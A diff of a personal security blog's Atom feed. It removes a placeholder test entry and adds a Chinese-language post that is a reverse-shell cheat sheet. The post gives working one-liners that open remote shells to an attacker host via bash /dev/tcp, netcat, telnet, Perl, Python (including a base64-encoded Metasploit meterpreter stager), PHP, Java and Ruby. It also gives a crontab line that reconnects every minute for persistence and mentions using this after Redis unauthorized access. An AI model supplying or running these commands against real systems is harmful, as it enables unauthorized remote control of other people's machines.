@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://zerokeeper.github.io/"/>
-  <updated>2019-10-20T12:07:18.532Z</updated>
+  <updated>2019-10-20T08:49:18.408Z</updated>
   <id>http://zerokeeper.github.io/</id>
   
   <author>
@@ -15,32 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>test</title>
-    <link href="http://zerokeeper.github.io/web-security/test.html"/>
-    <id>http://zerokeeper.github.io/web-security/test.html</id>
-    <published>2019-10-20T12:05:42.000Z</published>
-    <updated>2019-10-20T12:07:18.532Z</updated>
-    
-    <content type="html"><![CDATA[<p>dsjaknfd</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/10/20/15715731634307.jpg" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/10/20/15715732131686.jpg" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;dsjaknfd&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/10/20/15715731634307.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;
-      
-    
-    </summary>
-    
-    
-      <category term="web-security" scheme="http://zerokeeper.github.io/categories/web-security/"/>
-    
-    
-  </entry>
   
   <entry>
     <title>pwnable.tw hacknote wp</title>
@@ -556,6 +530,32 @@
       <category term="dirty cow" scheme="http://zerokeeper.github.io/tags/dirty-cow/"/>
     
       <category term="提权" scheme="http://zerokeeper.github.io/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>各种环境下反弹shell的方法</title>
+    <link href="http://zerokeeper.github.io/experience/a-variety-of-environmental-rebound-shell-method.html"/>
+    <id>http://zerokeeper.github.io/experience/a-variety-of-environmental-rebound-shell-method.html</id>
+    <published>2017-03-18T01:51:00.000Z</published>
+    <updated>2019-10-20T07:31:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x01-bash版本："><a href="#0x01-bash版本：" class="headerlink" title="0x01 bash版本："></a>0x01 bash版本：</h2><pre><code>bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</code></pre><p>注意这个是由解析shell的bash完成，所以某些情况下不支持。我用zsh不能反弹。这个也是最常用的。</p><h2 id="0x02-nc版本："><a href="#0x02-nc版本：" class="headerlink" title="0x02 nc版本："></a>0x02 nc版本：</h2><p>支持-e选项</p><pre><code>nc -e /bin/sh attackerip 1234</code></pre><p>这个方式最简单<br>不能使用-e选项时：</p><pre><code>mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 4444rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/</code></pre><p>安装的NC版本有问题时：</p><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</code></pre><h2 id="0x03-Telnet版本：-nc不可用或-dev-tcp不可用时"><a href="#0x03-Telnet版本：-nc不可用或-dev-tcp不可用时" class="headerlink" title="0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)"></a>0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)</h2><pre><code>mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h2 id="0x04-Perl版本："><a href="#0x04-Perl版本：" class="headerlink" title="0x04 Perl版本："></a>0x04 Perl版本：</h2><pre><code>perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>不依赖于/bin/sh的shell： ***这条语句比上面的更为简短，而且确实不需要依赖/bin/sh</p><pre><code>perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</code></pre><h2 id="0x05-Python版本："><a href="#0x05-Python版本：" class="headerlink" title="0x05 Python版本："></a>0x05 Python版本：</h2><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><p>另外的形式：</p><pre><code>python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;127.0.0.1&apos;,9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</code></pre><p>另外Metasploit版的代码：</p><pre><code>msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234import base64; exec(base64.b64decode(&apos;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg==&apos;))</code></pre><h2 id="0x06-php版本："><a href="#0x06-php版本：" class="headerlink" title="0x06 php版本："></a>0x06 php版本：</h2><pre><code>php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h2 id="0x07-java版本："><a href="#0x07-java版本：" class="headerlink" title="0x07 java版本："></a>0x07 java版本：</h2><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre><h2 id="0x08-ruby版本："><a href="#0x08-ruby版本：" class="headerlink" title="0x08 ruby版本："></a>0x08 ruby版本：</h2><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><p>不依赖于/bin/sh的shell：</p><pre><code>ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;</code></pre><p>如果目标系统运行Windows：</p><pre><code>ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;</code></pre><h2 id="0x09-crontab定时任务："><a href="#0x09-crontab定时任务：" class="headerlink" title="0x09 crontab定时任务："></a>0x09 crontab定时任务：</h2><p>这也是在redis未授权访问的时候使用过的。<br>crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是/var/spool/cron/目录，ubuntu是/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。具体crontab用法可以参考<a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">Crontab定时任务配置</a></p><pre><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</code></pre><p>最后其实发现，虽然形式不同，但是其实都是基于/bin/bash和/bin/sh</p><h2 id="0x10-参考："><a href="#0x10-参考：" class="headerlink" title="0x10 参考："></a>0x10 参考：</h2><p><a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">LINUX下反弹SHELL的种种方式</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;0x01-bash版本：&quot;&gt;&lt;a href=&quot;#0x01-bash版本：&quot; class=&quot;headerlink&quot; title=&quot;0x01 bash版本：&quot;&gt;&lt;/a&gt;0x01 bash版本：&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev
+      
+    
+    </summary>
+    
+    
+      <category term="experience" scheme="http://zerokeeper.github.io/categories/experience/"/>
+    
+    
+      <category term="反弹shell" scheme="http://zerokeeper.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"/>
     
   </entry>
   
